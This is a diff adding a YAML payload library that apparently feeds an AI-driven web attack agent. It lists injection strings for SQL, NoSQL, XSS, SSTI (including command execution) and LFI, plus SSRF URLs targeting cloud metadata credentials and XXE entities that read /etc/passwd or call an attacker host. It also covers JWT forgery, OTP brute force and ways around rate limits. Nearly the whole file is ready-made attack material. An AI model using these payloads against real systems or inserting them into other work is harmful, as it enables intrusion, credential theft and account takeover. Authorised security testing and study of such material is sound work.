@@ -1,0 +1,191 @@
+# attack_patterns.yaml — Complete attack knowledge base
+# Used by AI brain as rule injection + fallback decisions
+
+patterns:
+  idor:
+    id_params: [id, user_id, order_id, account_id, uid, pid, doc_id, file_id,
+                invoice_id, ticket_id, report_id, profile_id, item_id, record_id,
+                customer_id, transaction_id, payment_id, subscription_id]
+    id_types:
+      integer_sequential: true
+      uuid: true
+      base64_encoded: true
+      hash_md5: true
+    methods_to_test: [GET, POST, PUT, DELETE, PATCH]
+    severity: HIGH
+    detection_keywords: []
+    false_positive_indicators: ["same response size", "404 on all IDs"]
+
+  jwt:
+    detection_pattern: "eyJ"
+    algorithms_to_test: [none, HS256, RS256]
+    attacks:
+      none_algorithm:
+        description: "Change alg to none, remove signature"
+        severity: CRITICAL
+      weak_secret:
+        description: "Brute force HMAC secret"
+        wordlists: ["rockyou.txt", "common-passwords.txt"]
+        severity: CRITICAL
+      role_claim_change:
+        description: "Change role/admin claim in payload"
+        severity: CRITICAL
+      kid_injection:
+        payloads: ["../../../etc/passwd", "' UNION SELECT 'attacker_key'--"]
+        severity: HIGH
+      alg_confusion:
+        description: "RS256 to HS256 using public key as secret"
+        severity: CRITICAL
+
+  otp:
+    detection_endpoints: [otp, code, token, verify, confirm, validate, pin]
+    length_patterns: [4, 6, 8]
+    attacks:
+      brute_force:
+        description: "Try all combinations 0000-9999"
+        rate_limit_bypass: true
+        severity: CRITICAL
+      reuse:
+        description: "Submit same OTP twice"
+        severity: HIGH
+      param_tamper:
+        description: "Change email/phone to attacker's during verify"
+        severity: CRITICAL
+      response_manipulation:
+        description: "Intercept verify response, change to 200/success"
+        severity: HIGH
+      concurrent:
+        description: "Submit multiple OTPs simultaneously"
+        severity: MEDIUM
+
+  sql_injection:
+    detection_params: [id, search, query, q, name, username, email, order, sort]
+    payloads:
+      error_based: ["'", "''", "1'", "1''", "1 AND 1=1", "1 AND 1=2"]
+      boolean_based: ["' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(0)--"]
+      time_based: ["1' AND SLEEP(5)--", "1; WAITFOR DELAY '0:0:5'--"]
+      union_based: ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--"]
+    error_indicators:
+      - "you have an error in your sql syntax"
+      - "warning: mysql"
+      - "unclosed quotation mark"
+      - "quoted string not properly terminated"
+      - "pg_query"
+      - "ora-01756"
+      - "sqlite3.operationalerror"
+      - "invalid input syntax"
+    severity: CRITICAL
+
+  nosql_injection:
+    payloads:
+      mongodb: ['{"$gt": ""}', '{"$regex": ".*"}', '{"$where": "1==1"}',
+                '{"$ne": null}', '{"$exists": true}']
+    targets: [username, password, email, id]
+    severity: HIGH
+
+  xss:
+    contexts:
+      html: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
+             '<svg onload=alert(1)>', '<iframe src=javascript:alert(1)>']
+      attribute: ['" onmouseover=alert(1) x="', "' onfocus=alert(1) autofocus='",
+                  '" autofocus onfocus=alert(1) "']
+      javascript: ["';alert(1);//", '";alert(1);//', '\';alert(1);//']
+      url: ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
+    stored_test_markers: ["pentest_marker_xss_"]
+    severity: HIGH
+
+  ssrf:
+    payloads:
+      aws_imds: ["http://169.254.169.254/latest/meta-data/",
+                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                 "http://169.254.170.2/v2/credentials"]
+      gcp_imds: ["http://metadata.google.internal/computeMetadata/v1/",
+                 "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"]
+      azure_imds: ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"]
+      internal: ["http://127.0.0.1:80", "http://localhost:80", "http://[::1]:80",
+                 "http://0.0.0.0:80", "http://0177.0.0.1"]
+      bypass: ["http://0x7f000001", "http://2130706433", "http://017700000001"]
+    params: [url, uri, path, dest, destination, redirect, callback, return,
+             return_url, next, data, reference, ref, feed, host, to, from,
+             load_url, file_name, open, img, src]
+    severity: CRITICAL
+
+  xxe:
+    payloads:
+      classic: |
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <root>&xxe;</root>
+      ssrf: |
+        <?xml version="1.0"?>
+        <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://ATTACKER/xxe">]>
+        <root>&xxe;</root>
+    severity: CRITICAL
+
+  ssti:
+    payloads_by_engine:
+      jinja2: ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{self._TemplateReference__context}}"]
+      twig: ["{{7*7}}", "{{7*'7'}}", "{{_self.env.getExtension('Twig_Extension_Debug')}}"]
+      freemarker: ["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"]
+      velocity: ["#set($x=7*7)${x}"]
+      smarty: ["{7*7}", "{$smarty.version}"]
+    detection: "49"
+    severity: CRITICAL
+
+  lfi:
+    payloads: ["../../etc/passwd", "../../../etc/passwd",
+               "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd",
+               "../../etc/passwd%00", "../../../etc/shadow",
+               "php://filter/read=convert.base64-encode/resource=index.php"]
+    params: [file, page, path, include, template, load, read, open, lang, locale]
+    severity: HIGH
+
+  cors:
+    test_origins:
+      - "https://evil.com"
+      - "null"
+      - "https://evil.TARGET.COM"
+      - "https://TARGET.COM.evil.com"
+    critical_header: "access-control-allow-credentials"
+    severity: HIGH
+
+  open_redirect:
+    payloads: ["//evil.com", "https://evil.com", "/\\evil.com",
+               "https:evil.com", "///evil.com", "////evil.com"]
+    params: [next, redirect, url, return, return_url, dest, destination,
+             goto, redir, redirect_to, location, target, to]
+    severity: MEDIUM
+
+  business_logic:
+    quantity_manipulation:
+      payloads: [-1, 0, 0.001, 999999, -999999]
+      params: [quantity, qty, amount, count, num]
+    price_manipulation:
+      payloads: [0, -1, 0.01, 0.001, -100]
+      params: [price, amount, total, cost, fee]
+    coupon_attacks:
+      reuse: true
+      stacking: true
+    payment_skip:
+      description: "Access order confirm without paying"
+    severity: HIGH
+
+  mass_assignment:
+    injectable_fields: [role, is_admin, admin, verified, active, balance,
+                        credit, permissions, level, status, privileged,
+                        is_superuser, staff, superadmin, accountType]
+    severity: HIGH
+
+  rate_limit_bypass:
+    header_rotation:
+      - "X-Forwarded-For"
+      - "X-Real-IP"
+      - "X-Originating-IP"
+      - "X-Remote-IP"
+      - "X-Client-IP"
+      - "CF-Connecting-IP"
+      - "True-Client-IP"
+    path_variations: true
+    param_pollution: true
+    case_variation: true
+    severity: MEDIUM
